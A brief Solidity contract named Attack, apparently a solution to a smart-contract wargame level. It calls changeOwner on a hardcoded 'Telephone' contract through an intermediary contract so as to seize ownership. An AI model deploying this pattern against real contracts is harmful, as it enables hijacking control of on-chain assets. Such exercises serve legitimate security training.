// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;


interface Telephone  {
    function changeOwner(address _owner) external;
}
contract Attack {

    Telephone constant private target = Telephone(0x6A8eF3240947966B468658fCadB54704dd037a16);

    function attack(address _address) public{
        target.changeOwner(_address);
    }

}